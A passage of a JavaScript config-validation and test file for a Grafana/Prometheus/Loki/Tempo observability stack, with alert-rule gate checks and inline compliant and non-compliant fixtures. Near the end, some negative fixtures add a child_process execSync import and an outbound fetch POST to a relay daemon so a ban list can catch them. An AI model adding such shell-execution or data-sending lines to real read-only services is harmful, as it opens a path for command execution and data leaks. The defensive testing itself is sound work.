  if (noDataIdx.length !== 1) {
    return fail(
      `G13c: rule \`${rule.uid}\` declares ${noDataIdx.length} \`noDataState:\` keys; exactly 1 ` +
        "is required. Omission defaults to Grafana's own routing for the rule's absent-data " +
        'behaviour, which for a lateness ratio over a legitimately quiet window (every scheduled ' +
        'function idle) is exactly the false-positive shape this key exists to name and pin.',
    );
  }
  const noDataState = scalarOf(rule.lines[noDataIdx[0]], 'noDataState');
  if (noDataState !== 'OK') {
    return fail(
      `G13c: rule \`${rule.uid}\` declares \`noDataState: ${noDataState}\`, expected \`OK\` — ` +
        'anything else fires on a legitimately empty numerator/denominator rather than staying quiet',
    );
  }

  if (rule.forSeconds === null) return fail(`G13c: rule \`${rule.uid}\` declares no \`for:\``);
  if (rule.forSeconds === 0 || rule.forSeconds % rule.groupIntervalSeconds !== 0) {
    return fail(
      `G13c: rule \`${rule.uid}\` declares \`for: ${rule.rawFor}\` (${rule.forSeconds}s), which ` +
        `is not a NON-ZERO exact multiple of its own group's interval (${rule.groupIntervalSeconds}s)`,
    );
  }

  const window = rateWindowSeconds(recordingRulesText, SCHEDULED_STARTS_SERIES);
  if (!window.ok) return fail(`G13c: ${window.detail}`);
  if (rule.forSeconds <= window.seconds) {
    return fail(
      `G13c: rule \`${rule.uid}\` declares \`for: ${rule.rawFor}\` (${rule.forSeconds}s), which ` +
        `is not STRICTLY GREATER than the ${window.seconds}s (\`[${window.raw}]\`) rate window the ` +
        'recorded series are computed over — a single late one-shot reaper invocation must not be ' +
        'able to fire this alert',
    );
  }

  return pass(
    `G13c: rule \`${rule.uid}\` (severity warning, not paused, uid distinct, noDataState OK) ` +
      `thresholds a ${shape.evaluatorType} [${shape.params.join(', ')}] node on datasource ` +
      `\`${ruleExprEntry.datasourceUid}\` (matching AlloyIngestStalled), with for: ${rule.rawFor} ` +
      `(${rule.forSeconds}s), a multiple of its ${rule.groupIntervalSeconds}s group interval and ` +
      `> ${window.seconds}s`,
  );
}

/** The on-time selector's `le=` value, as parsed text (not a number: `+Inf` is not one). */
function schedulerOnTimeLeValue(recordingRulesText) {
  const parsed = parseRecordingGroups(recordingRulesText);
  if (!parsed.ok) return fail(parsed.detail);
  const rule = parsed.rules.find((r) => r.name === SCHEDULED_ON_TIME_SERIES);
  if (rule === undefined) {
    return fail(`no recording rule named \`${SCHEDULED_ON_TIME_SERIES}\` was parsed`);
  }
  const selectors = scheduledFnSelectors(rule.expr);
  if (selectors === null || selectors.length !== 1) {
    return fail(
      `rule \`${SCHEDULED_ON_TIME_SERIES}\` does not carry exactly one ` +
        `\`${SCHEDULED_FN_METRIC}{...}\` selector`,
    );
  }
  const body = selectors[0].body;
  const needle = 'le="';
  const at = body.indexOf(needle);
  if (at === -1) {
    return fail(`rule \`${SCHEDULED_ON_TIME_SERIES}\`'s selector has no \`le="..."\` matcher`);
  }
  const start = at + needle.length;
  const end = body.indexOf('"', start);
  if (end === -1) {
    return fail(`rule \`${SCHEDULED_ON_TIME_SERIES}\`'s \`le=\` matcher is unterminated`);
  }
  return { ok: true, value: body.slice(start, end) };
}

/**
 * G13d — number identity (the alert's evaluator param IS the panel's
 * threshold value, never two independently maintained literals) plus the
 * bucket-edge LATTICE (the on-time selector's `le=` must be a REAL edge).
 */
export function checkSchedulerNumberIdentity(alertRulesText, dashboardJsonText, recordingRulesText) {
  const alertParam = schedulerAlertEvaluatorParam(alertRulesText);
  if (!alertParam.ok) return fail(`G13d: ${alertParam.detail}`);

  const panelRes = schedulerPanel(dashboardJsonText);
  if (!panelRes.ok) return fail(`G13d: ${panelRes.detail}`);
  const steps = panelRes.panel?.fieldConfig?.defaults?.thresholds?.steps;
  if (!Array.isArray(steps) || steps.length === 0) {
    return fail('G13d: the scheduler-lateness panel declares no `thresholds.steps`');
  }
  const matchingStep = steps.filter((s) => s?.value === alertParam.value);
  if (matchingStep.length !== 1) {
    return fail(
      `G13d: the alert's evaluator param (${alertParam.value}) and the panel's threshold step ` +
        `values ([${steps.map((s) => s?.value).join(', ')}]) do not identify exactly one shared ` +
        'number — these two must be the SAME number, never independently maintained',
    );
  }

  const le = schedulerOnTimeLeValue(recordingRulesText);
  if (!le.ok) return fail(`G13d: ${le.detail}`);
  if (!SCHEDULED_DELAY_BUCKET_EDGES.includes(le.value)) {
    return fail(
      `G13d: the on-time selector's \`le="${le.value}"\` is OFF-LATTICE — it is not a real bucket ` +
        `edge SpacetimeDB 2.8.1 emits ([${SCHEDULED_DELAY_BUCKET_EDGES.join(', ')}]). A value here ` +
        'that Prometheus never actually buckets to (e.g. `0.03`, sitting between the real 0.01 and ' +
        '0.05 edges) silently records ZERO on-time events forever — the ratio pins at 100% ' +
        'lateness regardless of reality.',
    );
  }

  return pass(
    `G13d: the alert's evaluator param and the panel's threshold step agree at ` +
      `${alertParam.value}, and the on-time selector's le="${le.value}" is a real measured bucket edge`,
  );
}

/**
 * G13e — the numbered-provenance comment block. RAW TEXT ONLY: `stripHashComments`
 * deletes precisely the `#` prose this gate is looking for, so feeding it
 * comment-stripped text would make this check silently and permanently
 * vacuous. Every needle below must appear on a `#` comment LINE, not merely
 * anywhere in the file (a coincidental substring in an expr would otherwise
 * satisfy it).
 */
const SCHEDULER_PROVENANCE_NEEDLES = ['30 ms', 'log::warn!', 'not a bucket edge'];
const SCHEDULER_PROVENANCE_NUMBERING = ['(1)', '(2)', '(3)'];

export function checkSchedulerProvenanceBlock(rawRecordingRulesText) {
  const lines = rawRecordingRulesText.split('\n');
  for (const needle of SCHEDULER_PROVENANCE_NEEDLES) {
    const onComment = lines.some((line) => {
      const t = line.trim();
      return t.startsWith('#') && t.includes(needle);
    });
    if (!onComment) {
      return fail(
        `G13e: no \`#\` comment line in recording.rules.yml's RAW text contains \`${needle}\` — ` +
          'the numbered-provenance block above the mr-scheduler rules must name 30 ms as ' +
          "SpacetimeDB's OWN late-start log::warn! threshold and state plainly that it is NOT a " +
          'bucket edge, or the next reader conflates the two instruments. NOTE for anyone ' +
          'debugging this check: it MUST run over RAW text — `stripHashComments` deletes exactly ' +
          'the prose this gate is looking for, which would make this check pass on absence.',
      );
    }
  }
  let numbered = 0;
  for (const marker of SCHEDULER_PROVENANCE_NUMBERING) {
    const onComment = lines.some((line) => {
      const t = line.trim();
      return t.startsWith('#') && t.includes(marker);
    });
    if (onComment) numbered++;
  }
  if (numbered !== SCHEDULER_PROVENANCE_NUMBERING.length) {
    return fail(
      `G13e: only ${numbered}/${SCHEDULER_PROVENANCE_NUMBERING.length} numbered provenance ` +
        `markers (${SCHEDULER_PROVENANCE_NUMBERING.join(', ')}) were found on \`#\` comment lines ` +
        '— the block must be numbered so a reader can tell each measured fact apart',
    );
  }
  return pass(
    'G13e: the numbered-provenance comment block names 30 ms as the host log::warn! threshold ' +
      'and explicitly NOT a bucket edge',
  );
}

// ===========================================================================
// PROOF-OF-TEETH — inline fixtures, always run, FIRST
// ===========================================================================

function composeWith(names) {
  const out = ['services:'];
  for (const n of names) {
    out.push(`  ${n}:`);
    out.push(`    image: example/${n}:v1@sha256:00ff00ff`);
  }
  return out.join('\n');
}

// Assembled INDEPENDENTLY of the scanner's own needles: if a needle above is
// mutated, T-c still spells the real literal and the tooth reddens.
const FIXTURE_ENTER = `Some(${String.fromCharCode(34)}enter${String.fromCharCode(34)})`;
const FIXTURE_EXIT = `Some(${String.fromCharCode(34)}exit${String.fromCharCode(34)})`;

const SRC_PAIRED = [
  '#[spacetimedb::reducer]',
  'pub fn synthetic_paired(ctx: &ReducerContext) -> Result<(), String> {',
  `    mr_log_breadcrumb("span", "", Breadcrumb { cause: Some("z"), phase: ${FIXTURE_ENTER}, ..Default::default() });`,
  '    if ctx.sender != ctx.identity() { return Err("no".to_string()); }',
  `    mr_log_breadcrumb("span", "", Breadcrumb { cause: Some("z"), phase: ${FIXTURE_EXIT}, ..Default::default() });`,
  '    Ok(())',
  '}',
].join('\n');

const SRC_SPLIT_ACROSS_REDUCERS = [
  '#[spacetimedb::reducer]',
  'pub fn only_enter(ctx: &ReducerContext) -> Result<(), String> {',
  '    let _ = ctx;',
  `    mr_log_breadcrumb("span", "", Breadcrumb { phase: ${FIXTURE_ENTER}, ..Default::default() });`,
  '    Ok(())',
  '}',
  '',
  '#[spacetimedb::reducer]',
  'pub fn only_exit(ctx: &ReducerContext) -> Result<(), String> {',
  '    let _ = ctx;',
  `    mr_log_breadcrumb("span", "", Breadcrumb { phase: ${FIXTURE_EXIT}, ..Default::default() });`,
  '    Ok(())',
  '}',
].join('\n');

const SRC_ORPHAN_HELPER = [
  'fn helper_not_a_reducer() {',
  `    mr_log_breadcrumb("span", "", Breadcrumb { phase: ${FIXTURE_ENTER}, ..Default::default() });`,
  `    mr_log_breadcrumb("span", "", Breadcrumb { phase: ${FIXTURE_EXIT}, ..Default::default() });`,
  '}',
].join('\n');

const SRC_DOC_MENTION_ONLY = [
  '#[spacetimedb::reducer]',
  'pub fn documented(ctx: &ReducerContext) -> Result<(), String> {',
  `    // a doc mention of ${FIXTURE_ENTER} / ${FIXTURE_EXIT} is not a call site`,
  '    let _ = ctx;',
  '    Ok(())',
  '}',
].join('\n');

const DS_GOOD = [
  'apiVersion: 1',
  '',
  'datasources:',
  '  - name: Loki',
  '    type: loki',
  '    uid: mr-loki',
  '    correlations:',
  '      - targetUID: mr-tempo',
  '        label: Logs to trace',
  '        type: query',
  '        config:',
  '          field: connection_id',
  '          target:',
  '            queryType: traceql',
  '            query: \'{ span.connection_id = "$${__value.raw}" }\'',
  '  - name: Tempo',
  '    type: tempo',
  '    uid: mr-tempo',
  '    jsonData:',
  '      tracesToLogsV2:',
  '        datasourceUid: mr-loki',
  '        customQuery: true',
  '        query: \'{job="spacetimedb-module"} | json | connection_id = "$${__span.tags.connection_id}"\'',
  '    correlations:',
  '      - targetUID: mr-loki',
  '        label: Trace to logs',
  '        type: query',
  '        config:',
  '          field: connection_id',
  '          target:',
  '            expr: \'{job="spacetimedb-module"} | json | connection_id = "$${__value.raw}"\'',
].join('\n');

// tracesToLogsV2 present and correctly targeted, but the query is a bare job
// selector: a time-window join that LOOKS like a pivot.
const DS_NO_PIVOT_KEY = DS_GOOD.replace(
  '| json | connection_id = "$${__span.tags.connection_id}"',
  '',
);

// Only the Loki -> Tempo leg. Derived-field-style thinking: "one direction is
// enough". It is not — correlations are one-way.
const DS_ONE_DIRECTION = DS_GOOD.split('\n')
  .slice(0, DS_GOOD.split('\n').indexOf('    correlations:', 20))
  .join('\n');

const RULES_UNPARSEABLE_MATCHER = [
  'groups:',
  '  - name: mr-slo',
  '    rules:',
  '      - record: mr:slo_set_txns_total:rate5m',
  '        expr: |',
  '          sum by (reducer) (rate(spacetime_num_txns_total{reducer=~"move_player|create_player',
].join('\n');

const RULES_TWO_AGREEING = [
  'groups:',
  '  - name: mr-slo',
  '    rules:',
  '      - record: a',
  '        expr: |',
  '          sum by (reducer) (rate(x{committed="true",reducer=~"move_player|evolve_monster"}[5m]))',
  '      - record: b',
  '        expr: |',
  '          sum by (reducer) (rate(x{reducer=~"move_player|evolve_monster"}[5m]))',
].join('\n');

const RULES_TWO_DISAGREEING = RULES_TWO_AGREEING.replace(
  'rate(x{reducer=~"move_player|evolve_monster"}',
  'rate(x{reducer=~"move_player"}',
);

const ALLOY_LABELS_WITH_CONNECTION_ID = [
  'loki.process "module_logs" {',
  '  stage.labels {',
  '    values = {',
  '      reducer       = "",',
  '      evt           = "",',
  '      connection_id = "",',
  '    }',
  '  }',
  '}',
].join('\n');

const ALLOY_LABELS_BOUNDED = ALLOY_LABELS_WITH_CONNECTION_ID.split('\n')
  .filter((l) => !l.includes('connection_id'))
  .join('\n');

const RULES_BY_CONNECTION_ID = [
  'groups:',
  '  - name: mr-slo',
  '    rules:',
  '      - record: mr:x',
  '        expr: |',
  '          sum by (connection_id) (rate(mr_log_events_total[5m]))',
].join('\n');

// ---------------------------------------------------------------------------
// 13r-a fixtures (T-h..T-l). Inline strings only — no fixture file is written.
// Every builder produces a COMPLIANT shape by default so each tooth can prove
// its detector ACCEPTS the good shape before proving it rejects the bad one.
// ---------------------------------------------------------------------------

function tempoServiceLines(o = {}) {
  const lines = ['  tempo:'];
  lines.push(`    image: ${o.image ?? 'grafana/tempo:2.10.7'}`);
  lines.push('    network_mode: host');
  lines.push(`    restart: ${o.restart ?? 'unless-stopped'}`);
  for (const extra of o.extraLines ?? []) lines.push(extra);
  if (o.omitCommand !== true) {
    lines.push('    command:');
    for (const item of o.command ?? [TEMPO_FLAG_CONFIG, TEMPO_FLAG_LISTEN]) {
      lines.push(`      - ${item}`);
    }
  }
  return lines;
}

function tempoCompose(o = {}) {
  const out = [];
  // The AM17 decoy: a top-level `x-decoy:` key holding a fully compliant
  // `tempo:` at the same two-space indent a whole-file search looks for. It sits
  // BEFORE `services:` so a `findIndex` would return it first.
  if (o.decoy === true) {
    out.push('x-decoy:');
    out.push(...tempoServiceLines());
  }
  out.push('services:');
  out.push('  prometheus:');
  out.push('    image: prom/prometheus:v3.13.2');
  out.push('    restart: unless-stopped');
  if (o.omitService !== true) out.push(...tempoServiceLines(o));
  return out.join('\n');
}

function alertRulesDoc(o = {}) {
  const lines = ['apiVersion: 1', '', 'groups:'];
  if (o.emptyGroups === true) return lines.join('\n');
  lines.push('  - orgId: 1');
  lines.push(`    name: ${o.groupName ?? 'meta-monitoring'}`);
  lines.push('    folder: Monster Realm');
  if (o.omitInterval !== true) lines.push(`    interval: ${o.interval ?? '20s'}`);
  if (o.secondInterval !== undefined) lines.push(`    interval: ${o.secondInterval}`);
  if (o.emptyRules === true) {
    lines.push('    rules: []');
    return lines.join('\n');
  }
  lines.push('    rules:');
  lines.push('      - uid: mr-alloy-down');
  lines.push('        title: AlloyDown');
  lines.push('        condition: C');
  if (o.omitFor !== true) lines.push(`        for: ${o.forValue ?? '60s'}`);
  lines.push('        labels:');
  lines.push('          severity: critical');
  return lines.join('\n');
}

const CONTACT_POINTS_DOC = ['apiVersion: 1', '', 'contactPoints:', '  - orgId: 1'].join('\n');
const NOTIFICATION_POLICIES_DOC = ['apiVersion: 1', '', 'policies:', '  - orgId: 1'].join('\n');

/** The three-document set Grafana actually provisions, rules.yml configurable. */
function alertingDocsFixture(o = {}) {
  return [
    { name: 'contact-points.yml', text: o.contactPoints ?? CONTACT_POINTS_DOC },
    {
      name: 'notification-policies.yml',
      text: o.notificationPolicies ?? NOTIFICATION_POLICIES_DOC,
    },
    { name: 'rules.yml', text: o.rules ?? alertRulesDoc() },
  ];
}

function dockerfileFixture(o = {}) {
  const out = ['FROM caddy:2.11.4-builder-alpine AS builder', 'RUN xcaddy build v2.11.4'];
  if (o.builderSetcap === true) out.push('RUN setcap -r /usr/bin/caddy');
  out.push('');
  out.push('FROM caddy:2.11.4-alpine');
  out.push('COPY --from=builder /usr/bin/caddy /usr/bin/caddy');
  out.push('RUN mkdir -p /data /config && chown -R 10001:10001 /data /config');
  out.push(...(o.tail ?? ['RUN setcap -r /usr/bin/caddy', 'USER 10001:10001']));
  out.push('ENTRYPOINT ["caddy"]');
  return out.join('\n');
}

function alloyCompose(o = {}) {
  const out = ['services:'];
  out.push('  prometheus:');
  out.push('    image: prom/prometheus:v3.13.2');
  out.push('    restart: unless-stopped');
  if (o.prometheusUser !== undefined) out.push(`    user: "${o.prometheusUser}"`);
  out.push('  alloy:');
  out.push('    image: grafana/alloy:v1.18.1');
  out.push('    network_mode: host');
  out.push('    restart: unless-stopped');
  if (o.omitUser !== true) out.push(`    user: "${o.user ?? '473:473'}"`);
  if (o.omitSecurityOpt !== true) {
    out.push('    security_opt:');
    for (const item of o.securityOpt ?? ['no-new-privileges:true']) out.push(`      - ${item}`);
  }
  if (o.omitCapDrop !== true) {
    out.push('    cap_drop:');
    out.push('      - ALL');
  }
  for (const extra of o.extraLines ?? []) out.push(extra);
  out.push('    volumes:');
  out.push('      - ./alloy/config.alloy:/etc/alloy/config.alloy:ro');
  out.push('    command:');
  out.push('      - run');
  out.push('    mem_limit: 1g');
  out.push('    cpus: 1.0');
  return out.join('\n');
}

// The two grammar mutations T-l exists to kill, spelled out rather than derived
// from the pinned constant: a mutation of that constant must not silently
// mutate the fixture that is supposed to catch it.
const BUILD_SHA_WIDENED =
  'delete_key(attributes, "build_sha") where not IsMatch(attributes["build_sha"], ' +
  '"^[0-9a-f]{1,40}$")';
const BUILD_SHA_NARROWED =
  'delete_key(attributes, "build_sha") where not IsMatch(attributes["build_sha"], ' +
  '"^[0-9a-f]{40}$")';

function alloyS4Fixture(o = {}) {
  const statements = o.statements ?? [
    S4_STATEMENT_KEEP_KEYS,
    S4_STATEMENT_ZONE_ID,
    S4_STATEMENT_BUILD_SHA,
    S4_STATEMENT_DEVICE_CLASS,
  ];
  const out = [];
  out.push('otelcol.receiver.otlp "s4" {');
  out.push('\toutput {');
  out.push('\t\tmetrics = [otelcol.processor.transform.s4_keep.input]');
  out.push('\t}');
  out.push('}');
  out.push('');
  out.push('otelcol.processor.transform "s4_keep" {');
  out.push('\tmetric_statements {');
  out.push('\t\tcontext = "datapoint"');
  out.push('\t\t// the allowlist bounds the label KEY space; the delete_key set bounds VALUES');
  out.push('\t\tstatements = [');
  for (const s of statements) out.push(`\t\t\t\`${s}\`,`);
  for (const s of o.commentedStatements ?? []) out.push(`\t\t\t// \`${s}\`,`);
  out.push('\t\t]');
  out.push('\t}');
  out.push('');
  out.push('\toutput {');
  out.push('\t\tmetrics = [otelcol.exporter.prometheus.s4.input]');
  out.push('\t}');
  out.push('}');
  // AM20: a second transform component holding the SAME statements verbatim,
  // whose output forwards nowhere. Every file-wide substring check stays green.
  if (o.parkedComponent === true) {
    out.push('');
    out.push('otelcol.processor.transform "parked_bounds" {');
    out.push('\tmetric_statements {');
    out.push('\t\tcontext = "datapoint"');
    out.push('\t\tstatements = [');
    out.push(`\t\t\t\`${S4_STATEMENT_KEEP_KEYS}\`,`);
    out.push(`\t\t\t\`${S4_STATEMENT_BUILD_SHA}\`,`);
    out.push('\t\t]');
    out.push('\t}');
    out.push('');
    out.push('\toutput {');
    out.push('\t\tmetrics = []');
    out.push('\t}');
    out.push('}');
  }
  return out.join('\n');
}

// ---------------------------------------------------------------------------
// 13r-b fixtures (T-m..T-p). Inline strings only — no fixture file is written.
// Every builder produces the COMPLIANT shape by default so each tooth proves its
// detector ACCEPTS the good shape before proving it rejects the bad one.
// ---------------------------------------------------------------------------

/**
 * The host path BOTH services mount. Spelled once here, and read from the alloy
 * block by the detector — the fixture and the gate must not agree by accident.
 */
const FIXTURE_MOUNT_SOURCE = '${MR_SPACETIME_DATA_DIR:-/var/lib/spacetime}/replicas';

/**
 * AM1 — the relay's CONTAINER target deliberately avoids the substring
 * `replicas`. `checkModuleLogsMountReadOnly` (C5,
 * checks/stack-config-checks.mjs:426-433) counts ANY whole-file line trimming to
 * `- ...replicas...` (without a `type:`) as a mount and requires it to end
 * `:ro` — so a compose `command:` list item `- --logs-dir=/data/replicas` is
 * itself read as a writable mount and C5 FAILS. Both lenses PoC'd this; the
 * prescribed "byte-identical mount shape" was literally unbuildable. The SOURCE
 * stays byte-identical to alloy's (which is what OBS-45's "the same bind mount"
 * is a claim about); the TARGET drops the substring. T-m pins BOTH halves of
 * that reasoning so a future author cannot "tidy" the target back.
 */
const FIXTURE_MOUNT_TARGET = '/data/module-logs';
const FIXTURE_RELAY_PORT = 9101;

function relayCompose(o = {}) {
  const out = ['services:'];
  // PROMETHEUS FIRST, carrying its own `--web.listen-address=127.0.0.1:9090`.
  // This is not decoration: a file-wide `indexOf('--web.listen-address=')` over
  // docker-compose.yml finds THIS occurrence (the real file's is at :51), so an
  // unscoped G9o would compare the relay's scrape target against 9090 and pass
  // a target nothing answers. T-n asserts the ordering explicitly.
  out.push('  prometheus:');
  out.push('    image: prom/prometheus:v3.13.2@sha256:0a0a');
  out.push('    network_mode: host');
  out.push('    command:');
  out.push('      - --config.file=/etc/prometheus/prometheus.yml');
  out.push('      - --web.listen-address=127.0.0.1:9090');
  out.push('  alloy:');
  out.push('    image: grafana/alloy:v1.18.1@sha256:0b0b');
  out.push('    network_mode: host');
  out.push('    volumes:');
  out.push('      - ./alloy/config.alloy:/etc/alloy/config.alloy:ro');
  out.push(`      - ${o.alloySource ?? FIXTURE_MOUNT_SOURCE}:/data/replicas:ro`);
  out.push('      - alloy-data:/var/lib/alloy/data');
  if (o.omitRelay === true) return out.join('\n');

  out.push(`  ${RELAY_SERVICE_NAME}:`);
  out.push('    image: node:24-alpine@sha256:0c0c');
  out.push('    network_mode: host');
  out.push('    restart: unless-stopped');
  out.push('    user: "473:473"');
  out.push('    read_only: true');
  for (const extra of o.extraLines ?? []) out.push(extra);
  if (o.omitVolumes !== true) {
    out.push('    volumes:');
    out.push('      - ./relay:/opt/relay:ro');
    if (o.omitMount !== true) {
      out.push(
        `      - ${o.mountSource ?? FIXTURE_MOUNT_SOURCE}:${o.mountTarget ?? FIXTURE_MOUNT_TARGET}` +
          `${o.mountMode ?? ':ro'}`,
      );
    }
  }
  if (o.omitCommand !== true) {
    out.push('    command:');
    const command = o.command ?? [
      'node',
      '/opt/relay/daemon.mjs',
      `--logs-dir=${o.logsDir ?? FIXTURE_MOUNT_TARGET}`,
      `--web.listen-address=127.0.0.1:${o.port ?? FIXTURE_RELAY_PORT}`,
      '--trace-pair-set=/opt/relay/trace-pair-set.json',
    ];
    for (const item of command) out.push(`      - ${item}`);
  }
  out.push('    mem_limit: 256m');
  out.push('    cpus: 0.5');
  return out.join('\n');
}

function relayJobLines(o = {}) {
  const lines = [`  - job_name: ${o.jobName ?? RELAY_SERVICE_NAME}`];
  if (o.omitMetricsPath !== true) lines.push(`    metrics_path: ${o.metricsPath ?? '/health'}`);
  lines.push('    static_configs:');
  lines.push(`      - targets: ['${o.host ?? '127.0.0.1'}:${o.port ?? FIXTURE_RELAY_PORT}']`);
  return lines;
}

function relayPrometheus(o = {}) {
  const out = [];
  // The AM12 decoy: a structurally PERFECT relay job under a top-level key that
  // is not `scrape_configs:`. Prometheus ignores it entirely; a flat line scan
  // for `job_name: mr-trace-relay` calls the target wired. It sits BEFORE
  // `scrape_configs:` so a first-match search finds it first.
  if (o.decoy === true) {
    out.push('x-parked:');
    out.push(...relayJobLines(o));
    out.push('');
  }
  out.push('scrape_configs:');
  out.push('  - job_name: spacetimedb');
  out.push('    metrics_path: /v1/metrics');
  out.push('    static_configs:');
  out.push("      - targets: ['127.0.0.1:3000']");
  out.push('');
  // No `metrics_path:` here on purpose: the default is legitimate for alloy, so
  // the gate must require the key on the RELAY job specifically, not globally.
  out.push('  - job_name: alloy');
  out.push('    static_configs:');
  out.push("      - targets: ['127.0.0.1:12345']");
  if (o.omitJob !== true && o.decoy !== true) {
    out.push('');
    out.push(...relayJobLines(o));
  }
  return out.join('\n');
}

/** One provisioned alert rule, in the exact `data:`/`__expr__` shape rules.yml uses. */
function alertRuleLines(o = {}) {
  const exprRef = o.exprRefId ?? 'A';
  const condRef = o.condRefId ?? 'C';
  const lines = [`      - uid: ${o.uid}`];
  lines.push(`        title: ${o.title}`);
  lines.push(`        condition: ${o.condition ?? condRef}`);
  if (o.noDataState !== undefined) lines.push(`        noDataState: ${o.noDataState}`);
  if (o.isPaused !== undefined) lines.push(`        isPaused: ${o.isPaused}`);
  // `for:` PRECEDES `expr:` here exactly as it does in the committed file — the
  // scan-direction trap is baked into the fixture rather than described.
  lines.push(`        for: ${o.forValue}`);
  lines.push('        labels:');
  lines.push(`          severity: ${o.severity ?? 'critical'}`);
  lines.push('        annotations:');
  lines.push(`          summary: ${o.title} has been down.`);
  lines.push('        data:');
  lines.push(`          - refId: ${exprRef}`);
  lines.push('            relativeTimeRange:');
  lines.push('              from: 300');
  lines.push('              to: 0');
  lines.push(`            datasourceUid: ${o.datasourceUid ?? 'mr-prometheus'}`);
  lines.push('            model:');
  lines.push(`              refId: ${exprRef}`);
  lines.push('              instant: true');
  lines.push(`              expr: ${o.expr}`);
  lines.push(`          - refId: ${condRef}`);
  lines.push(`            datasourceUid: ${o.conditionDatasourceUid ?? '__expr__'}`);
  lines.push('            model:');
  lines.push(`              refId: ${condRef}`);
  lines.push(`              type: ${o.thresholdType ?? 'threshold'}`);
  lines.push(`              expression: ${o.expression ?? exprRef}`);
  lines.push('              conditions:');
  lines.push('                - evaluator:');
  lines.push(`                    type: ${o.evaluatorType ?? 'lt'}`);
  lines.push('                    params:');
  for (const param of o.params ?? ['1']) lines.push(`                      - ${param}`);
  return lines;
}

function relayRuleLines(o = {}) {
  return alertRuleLines({
    uid: o.relayUid ?? 'mr-trace-relay-down',
    title: 'TraceRelayDown',
    forValue: o.relayFor ?? '60s',
    expr: o.relayExpr ?? RELAY_UP_NEEDLE,
    severity: o.relaySeverity,
    condition: o.relayCondition,
    evaluatorType: o.relayEvaluatorType,
    thresholdType: o.relayThresholdType,
    params: o.relayParams,
    isPaused: o.relayPaused,
    datasourceUid: o.relayDatasourceUid,
    conditionDatasourceUid: o.relayConditionDatasourceUid,
    expression: o.relayExpression,
  });
}

/**
 * A rules.yml with AlloyDown (`for: 60s`), AlloyIngestStalled (`for: 10m`) and
 * the relay rule, IN THAT ORDER — three rules with THREE DIFFERENT `for:`
 * values. A detector that finds AlloyDown by its `expr:` and then scans FORWARD
 * for a `for:` reads AlloyIngestStalled's 10m, so the "relay for: == AlloyDown
 * for:" clause would accept `for: 10m` and reject the correct `60s`. Both
 * mistakes are tested in T-o.
 */
function deadMansRulesDoc(o = {}) {
  const lines = ['apiVersion: 1', '', 'groups:'];
  lines.push('  - orgId: 1');
  lines.push('    name: meta-monitoring');
  lines.push('    folder: Monster Realm');
  lines.push(`    interval: ${o.interval ?? '20s'}`);
  lines.push('    rules:');
  lines.push(
    ...alertRuleLines({
      uid: 'mr-alloy-down',
      title: 'AlloyDown',
      forValue: '60s',
      expr: o.alloyExpr ?? ALLOY_UP_NEEDLE,
    }),
  );
  lines.push(
    ...alertRuleLines({
      uid: 'mr-alloy-ingest-stalled',
      title: 'AlloyIngestStalled',
      forValue: '10m',
      severity: 'warning',
      expr: 'mr:alloy_log_bytes_read:rate5m',
    }),
  );
  if (o.omitRelayRule !== true && o.relayInSecondGroup !== true) {
    lines.push(...relayRuleLines(o));
  }
  if (o.relayInSecondGroup === true) {
    lines.push('  - orgId: 1');
    lines.push('    name: relay-monitoring');
    lines.push('    folder: Monster Realm');
    lines.push(`    interval: ${o.relayGroupInterval ?? '60s'}`);
    lines.push('    rules:');
    lines.push(...relayRuleLines(o));
  }
  return lines.join('\n');
}

// --- T-p source fixtures ----------------------------------------------------
// Real-shaped relay sources, one per ban tier. The cheats below are each a
// MINIMAL delta from the corresponding good shape, so a tooth that reddens
// reddens for the construct it names and nothing else.

const PURE_GOOD = [
  'export function decide(state, observation) {',
  '  if (observation.size > state.prevOffset) {',
  "    return { readFrom: state.prevOffset, readTo: observation.size, reason: 'growth' };",
  '  }',
  "  return { readFrom: 0, readTo: 0, reason: 'noChange' };",
  '}',
].join('\n');

const BATCH_CLI_GOOD = [
  "import { readdirSync, readFileSync } from 'node:fs';",
  "import { reconstruct } from './reconstruct.mjs';",
  '',
  'export function collectLogFiles(dir) {',
  "  return readdirSync(dir).filter((name) => name.endsWith('.log'));",
  '}',
  '',
  'export function readAll(file) {',
  "  return readFileSync(file, 'utf8');",
  '}',
  '',
  'export function run(files, membership) {',
  '  return reconstruct(files.map(readAll), { tracePairSet: membership });',
  '}',
].join('\n');

const DAEMON_GOOD = [
  "import { createServer } from 'node:http';",
  "import { createReadStream, statSync } from 'node:fs';",
  '',
  "import { collectLogFiles } from './mr-trace-relay.mjs';",
  "import { decide } from './tail.mjs';",
  '',
  'export function startDaemon(options) {',
  '  const server = createServer((req, res) => {',
  '    res.end(renderExposition(options.state));',
  '  });',
  '  server.listen(options.port, options.host);',
  '  const timer = setInterval(() => poll(options), options.pollMs);',
  '  return { server, timer };',
  '}',
  '',
  'function poll(options) {',
  '  for (const file of collectLogFiles(options.logsDir)) {',
  '    const plan = decide(options.state.get(file), statSync(file));',
  '    createReadStream(file, { start: plan.readFrom, end: plan.readTo - 1 });',
  '  }',
  '}',
].join('\n');

const DAEMON_TEST_GOOD = [
  "import test from 'node:test';",
  "import assert from 'node:assert/strict';",
  '',
  "import { startDaemon } from './daemon.mjs';",
  '',
  "test('the dispatch surface is exactly /health', () => {",
  '  const transport = { bound: false, bind() { this.bound = true; } };',
  '  const clock = { armed: null, setTimer(fn) { this.armed = fn; } };',
  '  const daemon = startDaemon({ transport, clock });',
  "  assert.deepEqual(Object.keys(daemon.routes), ['/health']);",
  '});',
].join('\n');

const DAEMON_NO_READ = [
  "import { createServer } from 'node:http';",
  '',
  'export function startDaemon(options) {',
  '  const server = createServer((req, res) => res.end());',
  '  server.listen(options.port, options.host);',
  '  setInterval(() => options.tick(), options.pollMs);',
  '  return server;',
  '}',
].join('\n');

// Assembled from fragments so that no CODE line of THIS file spells the
// dynamic-regexp constructor contiguously (remote Semgrep matches raw text) —
// while the fixture itself contains it verbatim, which is what must be caught.
const DAEMON_WITH_DYNAMIC_REGEXP = `${DAEMON_GOOD}\nconst rx = new Reg${'Exp('}options.pattern);`;
const DAEMON_WITH_CHILD_PROCESS = `${DAEMON_GOOD}\nimport { execSync } from 'node:child_process';`;
const DAEMON_WITH_FETCH = `${DAEMON_GOOD}\nawait fetch(options.endpoint, { method: 'POST' });`;
const DAEMON_WITH_REQUEST = `${DAEMON_GOOD}\nconst out = client.request(options.headers);`;
const DAEMON_WITH_UNDICI = `${DAEMON_GOOD}\nimport { Agent } from 'undici';`;
const DAEMON_WITH_DATE_NOW = `${DAEMON_GOOD}\nconst emittedAt = Date.now();`;
